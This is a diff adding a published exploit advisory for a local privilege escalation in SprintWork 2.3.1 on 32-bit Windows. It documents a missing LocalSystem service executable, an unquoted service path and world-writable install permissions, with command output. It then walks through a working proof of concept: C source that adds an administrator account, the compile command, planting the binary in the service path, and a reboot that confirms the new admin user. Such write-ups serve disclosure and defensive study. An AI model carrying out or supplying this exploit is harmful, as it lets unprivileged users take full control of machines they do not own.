@@ -1,0 +1,128 @@
+# Exploit Title: SprintWork 2.3.1 - Local Privilege Escalation
+# Exploit Author: boku
+# Date: 2020-02-13
+# Vendor Homepage: https://veridium.net
+# Software Link:  https://veridium.net/files_u/spx/exe/SprintWork-Setup.exe
+# Version: 2.3.1
+# Tested On: Windows 10 (32-bit)
+
+# Vulnerability Overview:
+# SprintWork v2.3.1 (x86) suffers from insecure file & service & folder permissions, unquoted service paths, 
+# and a missing executable for one of the two Service it installs; to be ran as 'LocalSystem'. 
+# This allows any local user to gain persistent code-execution as 'LocalSystem'.
+# Both the 32bit & 64bit build of SprintWork v2.3.1 create the services 'SP52 AMC' & 'SprintWork TM VI', with the "StartMode" set to 'Auto', to be ran as 'LocalSystem'; these services will ran every time the computer starts. The 'SP52 AMC' Service is set to use the 'nvlsimw.exe' file. On the 32bit version, the 'nvlsimw.exe' file is never created. This, in combination with its other vulnerabilities, results in persistent code-execution for any local user as 'LocalSystem'. 
+# See Proof of Concept below for full details.
+# About:
+# "SprintWork Distraction Blocker -- Block Social Networks and Games, Track Time Spent on Websites and Programs, Maximize Productivity
+# + Block or time restrict social networks, online games or any website
+# - Block web distractions including social media, addictive gaming websites, video streaming websites or any website wasting your time.
+# + Block or time restrict games and programs
+# - Usage of non-work related applications can be blocked or limited to certain times of day, days of week or restricted to a total amount of time per day.
+# + Detailed activity monitoring and reporting
+# - Records time spent actively using programs, total run time of each program and start and end times of usage sessions as well as details of visited websites including time and total duration of visits.
+# + Selective user monitoring and blocking.
+# - Can exclude certain computer users from blocking rules and monitoring of activity. Useful for shared and family computers.
+# + Wildcard support
+# - Block websites that have certain words in their addresses or block an entire domain or only a specific sub-domain.
+# + Multiple website blocking lists.
+# - Block or set time restrictions collectively for groups of websites.
+# + Cannot be bypassed, deleted or disabled.
+# - Works with all browsers and Internet clients and cannot be forcefully stopped, disabled or uninstalled unless the lock time you've chosen expires and only after you enter your password."
+# - https://veridium.net/sprintwork/
+
+## Service Information (there is also an Unquoted Service Path)
+C:\>wmic service get name,pathname,startmode,StartName | findstr /v "C:\Windows" | findstr /i /c:Sprintwork
+SP52 AMC              C:\Program Files\SprintWork\nvlsimw.exe    Auto       LocalSystem               
+SprintWork TM VI      C:\Program Files\SprintWork\nvlsim.exe     Auto       LocalSystem 
+
+## Missing Executable file 'nvlsimw.exe' for the 'SP52 AMC' service 
+C:\>dir "C:\Program Files\SprintWork\" | findstr /i /c:"exe"
+11/23/2019  10:20 PM         1,345,536 NVLSIM.EXE
+12/25/2019  02:47 PM         1,202,688 qcden.exe
+12/25/2019  02:47 PM        14,436,864 SprintWork.exe
+11/23/2019  10:20 PM         1,557,504 txew.exe
+
+## Insecure Folder Permission
+C:\>icacls "C:\Program Files\SprintWork"
+C:\Program Files\SprintWork BUILTIN\Users:(F)
+                            BUILTIN\Users:(OI)(CI)(IO)(F)
+
+## Insecure File/Service Permission
+C:\>icacls "C:\Program Files\SprintWork\NVLSIM.EXE"
+C:\Program Files\SprintWork\NVLSIM.EXE BUILTIN\Users:(I)(F)
+
+## Local Privilege Escalation Proof of Concept
+#0. Download & install SprintWork v2.3.1 (x86) on Windows 10 32bit Operating System
+
+#1. Create low privileged user 
+C:\Windows\system32>net user lowpriv password /add
+
+#2. Change to lowpriv User
+C:\Users\lowPrivUser>net user lowprivuser | findstr /i "Membership Name" | findstr /v "Full"
+User name                    lowPrivUser
+Local Group Memberships      *Users
+Global Group memberships     *None
+C:\>whoami
+mycomputer\lowprivuser 
+
+#3. Create malicious binary on Kali Linux
+3.1) Download dependencies
+root@kali# apt install gcc-mingw-w64-i686 wine64 -y
+
+3.2) Create Add Admin User C Code
+root@kali# cat addAdmin.c
+#include<windows.h>
+int main(void){
+ system("net user adminpriv mypassword /add");
+ system("net localgroup Administrators adminpriv /add");
+ return 0;
+}
+
+3.3) Compile Code
+root@kali# i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o nvlsimw.exe
+
+#4. Transfer created 'nvlsimw.exe' to the Windows Host 
+
+#5. Move the created 'nvlsimw.exe' binary to the 'C:\Program Files\SprintWorks\' Directory
+C:\Users\lowpriv>move nvlsimw.exe "C:\Program Files\SprintWork\"
+        1 file(s) moved.
+
+C:\Users\lowpriv>dir "C:\Program Files\SprintWork\" | findstr /i /c:nvlsim
+11/23/2019  10:20 PM         1,345,536 NVLSIM.EXE
+02/13/2020  06:07 PM           288,469 nvlsimw.exe
+
+#6. Verify localgroup 'Administrators' members
+C:\Users\lowpriv>net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+boku
+
+#6. Reboot the Computer
+C:\Users\lowpriv>shutdown /r /t 0
+
+#7. Verify user 'adminpriv' was created & added to the localgroup 'Administrators'
+C:\>net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+adminpriv
+boku
+
+C:\>net user adminpriv | findstr /C:"User name" /C:active /C:Password /C:Group
+User name                    adminpriv
+Account active               Yes
+Password last set            ?2/?13/?2020 6:18:03 PM
+Password expires             Never
+Password changeable          ?2/?13/?2020 6:18:03 PM
+Password required            Yes
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
